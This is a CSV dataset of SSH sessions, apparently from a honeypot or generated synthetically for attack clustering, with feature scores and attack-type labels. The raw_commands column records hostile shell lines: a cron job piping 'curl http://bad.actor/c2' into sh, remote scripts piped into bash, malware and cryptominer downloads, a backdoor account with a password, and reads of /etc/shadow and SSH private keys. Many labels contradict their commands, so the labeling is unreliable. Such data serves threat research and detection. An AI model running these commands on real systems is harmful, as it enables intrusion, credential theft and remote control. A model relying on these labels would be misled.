session_id,src_ip,country,login_attempts,login_success,num_commands,session_duration,dst_port,recon_score,persistence_score,mining_score,lateral_score,exfil_score,has_download,has_chmod,has_cron,has_useradd,raw_commands,cluster,attack_type
e9758b613c8b4c81,164.92.98.77,United States,4,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
4f768a05221c4e82,91.240.118.172,Ukraine,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
801bb1b6b0654435,198.199.65.32,United States,3,1,3,15,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
f3f4315925754aea,45.142.212.100,Netherlands,5,1,2,22,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
5f3edda98f634708,80.82.77.139,Netherlands,5,1,1,21,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
044a3266781f4e18,164.92.98.77,United States,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a23c80f11f98465e,157.245.108.55,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
22e5983dbfd64290,138.197.148.152,United States,1,1,1,12,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
ccfe5fe24bd04343,198.199.65.32,United States,2,1,2,17,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
b96fbedb6eba4a02,134.209.82.19,United States,5,0,0,19,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ebe59d567b5145ba,91.240.118.172,Ukraine,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
66d0a1e8eb9545a1,206.189.32.177,United States,2,1,1,13,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
45490a32144445f3,193.32.162.8,Russia,4,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8d969021a7de41fb,193.32.162.8,Russia,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
738b9a59ea9d4bb6,180.129.12.93,China,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
9a81ced07ba14016,206.189.32.177,United States,3,1,3,20,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
413c7847e081483d,134.209.82.19,United States,1,1,3,13,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
7a33412941204eb2,104.236.198.48,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
b19a533cde4e4fe6,58.218.211.36,China,5,1,5,46,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
171143c597564c08,117.21.191.131,China,2,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
84b8f112880a4aeb,92.255.57.210,Russia,2,1,2,15,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
00d51fd8202f4b27,198.199.65.32,United States,3,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3edcf2c9211346d4,164.92.98.77,United States,2,1,3,28,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
41a0161995404e29,194.165.16.11,Russia,4,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5d7eb1828658425a,138.197.148.152,United States,2,1,5,35,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
973ddaae6abf469f,222.186.15.101,China,1,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
238f8bfa75da4153,5.188.86.172,Russia,1,1,1,9,22,0,1,0,0,0,1,0,0,0,curl -s http://45.33.32.156/install.sh | bash,4,Lateral Movement
c737cc683f61437e,206.189.32.177,United States,1,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ea5e231ab0e14c3a,194.165.16.11,Russia,5,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
499a2da64aed4167,179.60.150.100,Brazil,5,1,2,31,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
22ae61783e5c45db,138.197.148.152,United States,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e3f865127662460a,92.255.57.210,Russia,3,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
cb8e26b275f04935,198.199.65.32,United States,5,0,0,17,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ab24894e82984183,167.71.13.196,United States,4,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
979903c3cf444c70,222.186.15.101,China,5,1,3,21,22,1,0,0,3,1,0,0,0,0,cat ~/.ssh/known_hosts cat ~/.ssh/id_rsa ssh-keyscan 192.168.1.0/24,4,Lateral Movement
3c73351bcd9143ed,45.95.147.236,Netherlands,4,1,5,34,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
20d62d9e1c4a4b43,104.236.198.48,United States,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c7ab7f656f7a41fe,179.60.150.100,Brazil,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5370277303e242ae,80.82.77.139,Netherlands,5,1,3,22,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
06fcc33b1e854043,211.94.20.175,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
a3ad4b645a4147ed,138.197.148.152,United States,5,1,2,20,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
39ec2c04bdca4e89,178.128.21.44,Singapore,3,1,3,20,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
8b5cc8d6f0884271,222.186.15.101,China,4,1,3,27,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
3d0c9556a4994766,164.92.98.77,United States,4,1,3,27,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
a8da5ebf97bf4697,222.186.15.101,China,5,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
d464c4f5ec8b4a3f,211.94.20.175,China,1,1,3,11,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
e43a9956661c4c57,45.142.212.100,Netherlands,5,1,2,15,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
5c6a475b218f4aeb,117.21.191.131,China,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5d30b2231c404434,68.183.39.102,United States,4,1,5,42,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
058ea00a332e482b,178.128.21.44,Singapore,3,1,1,16,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
9e399d3b1c064073,211.94.20.175,China,3,0,0,13,22,0,0,0,0,0,0,0,0,0,0,1,Recon
48870e2d2a4c4e0a,45.142.212.100,Netherlands,3,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
8cb4920bfe7741a7,159.89.49.114,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
6a9745de8e414c02,92.255.57.210,Russia,1,1,1,6,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
a3effc2445454242,80.82.77.139,Netherlands,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
7735b4b14a554aa9,193.32.162.8,Russia,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
47fe64430bf948d8,206.189.32.177,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
02b097aa1d0e43de,167.71.13.196,United States,5,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
956116d37ef7415d,58.218.211.36,China,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
aaa720a93cc24c31,91.240.118.172,Ukraine,1,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
53a19fc9833c40d7,159.89.49.114,United States,1,1,3,18,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
b73bbaaab74c4104,180.129.12.93,China,2,1,3,22,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
f15862a587cb46db,179.60.150.100,Brazil,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3b0a91eb3ddc4199,185.220.101.45,Germany,1,1,1,10,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
cfb925d5f65c4401,58.218.211.36,China,3,1,5,35,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
6d723c7dfbd74169,178.128.21.44,Singapore,1,1,2,11,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
9cdd12e1c7384a1b,178.128.21.44,Singapore,4,0,0,10,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c8f727c376bd4354,180.129.12.93,China,3,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3f69b1d54bae46cb,68.183.39.102,United States,2,1,2,18,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
018947b8e9b341f7,178.128.21.44,Singapore,4,1,2,27,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
600ff79a5ee54db3,92.255.57.210,Russia,4,1,3,32,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
87e7a0db3fc84e28,193.32.162.8,Russia,1,1,3,15,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
cd9f5a03f3374225,206.189.32.177,United States,2,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3a10d1d6f55b4bd5,134.209.82.19,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
4f13f4e4f506434d,104.236.198.48,United States,3,1,3,29,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
eb3d3da4792b4609,218.92.0.158,China,3,1,1,12,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
a0d135ea38fc4b45,193.32.162.8,Russia,5,1,5,36,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
464da73b57c14f2b,218.92.0.158,China,4,0,0,16,22,0,0,0,0,0,0,0,0,0,0,1,Recon
eee85d6598834232,80.82.77.139,Netherlands,5,1,2,29,22,0,0,0,2,0,0,0,0,0,nmap -sn 10.0.0.0/24 arp -a,4,Lateral Movement
c33f10b11b214af6,159.89.49.114,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
104a37d69b424bb2,194.165.16.11,Russia,4,1,1,18,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
4cf924b57007431b,91.240.118.172,Ukraine,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
7ed72afdf2564040,58.218.211.36,China,4,1,2,19,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
4b9ebd64e58d4149,134.209.82.19,United States,3,1,2,24,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
0648506f06d34091,58.218.211.36,China,4,1,1,17,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
53f0fe074b104a59,159.89.49.114,United States,3,1,2,18,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
d8bf44dd0f3543a0,134.209.82.19,United States,1,0,0,3,22,0,0,0,0,0,0,0,0,0,0,1,Recon
01552a983d8d489e,159.89.49.114,United States,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
67e793029d15409b,185.220.101.45,Germany,4,0,0,12,22,0,0,0,0,0,0,0,0,0,0,1,Recon
675d392711c34f2c,159.89.49.114,United States,1,1,2,7,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
90fd19d016544cf6,91.240.118.172,Ukraine,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
3e8e838484d74903,164.92.98.77,United States,2,1,5,26,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
8feec6ba6d6a4292,180.129.12.93,China,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
7ac3c2a417d943e4,218.92.0.158,China,2,1,2,11,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
2537859a2b9248c6,117.21.191.131,China,1,1,5,21,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
3ec84f934eb5422a,198.199.65.32,United States,1,1,2,14,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
7ca368d636a847e7,179.60.150.100,Brazil,4,1,2,18,22,1,2,0,0,0,0,0,0,1,useradd -m -s /bin/bash backdoor echo 'backdoor:P@ss123' | chpasswd,5,Data Exfiltration
bfa6ba044332416d,138.197.148.152,United States,1,1,5,16,22,3,0,0,0,0,0,0,0,0,id pwd ls -la cat /etc/issue hostname,2,Persistence
a3ac807e71114732,178.128.21.44,Singapore,4,0,0,14,22,0,0,0,0,0,0,0,0,0,0,1,Recon
bcc34431a8ce4e81,206.189.32.177,United States,2,0,0,9,22,0,0,0,0,0,0,0,0,0,0,1,Recon
2f1564a8458544f4,159.89.49.114,United States,3,1,3,24,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
9290f4ebf7ba4d46,80.82.77.139,Netherlands,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e44f3c52c91b4253,159.89.49.114,United States,4,1,5,30,22,5,0,0,0,0,0,0,0,0,uname -a cat /proc/cpuinfo free -m df -h ifconfig,2,Persistence
c6ee9c29eb0b41db,178.128.21.44,Singapore,1,1,1,9,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
a4b1e491374d4788,157.245.108.55,United States,3,1,3,23,22,0,2,0,0,0,1,1,0,0,wget http://malicious.ru/bot -O /tmp/bot chmod +x /tmp/bot /tmp/bot &,3,Cryptominer
a6d56b56164945ef,103.99.0.122,India,3,1,1,15,22,0,1,0,0,0,1,0,1,0,echo '* * * * * curl http://bad.actor/c2 | sh' >> /var/spool/cron/root,0,Scanner
4e6f967c6f0b4033,5.188.86.172,Russia,3,1,2,13,22,1,0,0,1,2,0,0,0,0,find / -name '*.pem' 2>/dev/null find / -name 'id_rsa' 2>/dev/null,4,Lateral Movement
9adf20db1415424e,185.220.101.45,Germany,3,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
ce8b143cbbfc4abc,194.165.16.11,Russia,4,1,5,41,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
443ded979f5b4ac3,5.188.86.172,Russia,5,0,0,20,22,0,0,0,0,0,0,0,0,0,0,1,Recon
0949a6556bf44a08,104.236.198.48,United States,3,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
7db49ff7adda4f27,103.99.0.122,India,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
252ac9ce18734a67,218.92.0.158,China,4,1,3,25,22,0,0,0,0,1,0,0,0,0,history cat ~/.bash_history find /var/www -name '*.php' | xargs grep -l password,4,Lateral Movement
7d2afebd8dbf41b3,193.32.162.8,Russia,4,0,0,11,22,0,0,0,0,0,0,0,0,0,0,1,Recon
77d5bc31f9d34833,185.220.101.45,Germany,5,1,3,25,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
0edfe1dcdc3346b5,164.92.98.77,United States,4,1,3,31,22,0,2,3,0,0,1,1,0,0,wget http://xmrig.onion/xmrig chmod +x xmrig ./xmrig -o pool.minexmr.com:443 -u wallet,3,Cryptominer
b0ad76dd992b43b1,5.188.86.172,Russia,5,1,1,17,22,0,0,0,3,0,0,0,0,0,for i in $(seq 1 254); do ping -c1 192.168.1.$i; done,4,Lateral Movement
b37f324220364989,134.209.82.19,United States,2,0,0,7,22,0,0,0,0,0,0,0,0,0,0,1,Recon
1f1d0e557c2e43b6,117.21.191.131,China,4,1,3,30,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
0813fdd01fdf479b,104.236.198.48,United States,5,0,0,15,22,0,0,0,0,0,0,0,0,0,0,1,Recon
e77846b744b6445d,92.255.57.210,Russia,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
da32558fadb04cf8,167.71.13.196,United States,1,1,5,21,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
df79b193cb6d4ad1,218.92.0.158,China,5,1,2,21,22,0,1,1,0,0,1,0,0,0,curl http://mining.pool/miner.sh -o /tmp/.x bash /tmp/.x,4,Lateral Movement
27089bf97ee94ad3,80.82.77.139,Netherlands,2,0,0,5,22,0,0,0,0,0,0,0,0,0,0,1,Recon
c2ee4a7cd0674265,164.92.98.77,United States,2,0,0,6,22,0,0,0,0,0,0,0,0,0,0,1,Recon
83f7e44c7f2f4ef1,134.209.82.19,United States,2,1,3,22,22,2,0,0,0,3,0,0,0,0,cat /etc/shadow cat /etc/passwd tar czf /tmp/data.tgz /home/*,4,Lateral Movement
680ef60e801140bc,178.128.21.44,Singapore,5,1,5,47,22,6,0,0,0,0,0,0,0,0,uname -a whoami id cat /etc/passwd ls /,2,Persistence
4cdc10d09bbb4d20,157.245.108.55,United States,2,0,0,8,22,0,0,0,0,0,0,0,0,0,0,1,Recon
5ba2930ec268423e,159.89.49.114,United States,1,0,0,4,22,0,0,0,0,0,0,0,0,0,0,1,Recon
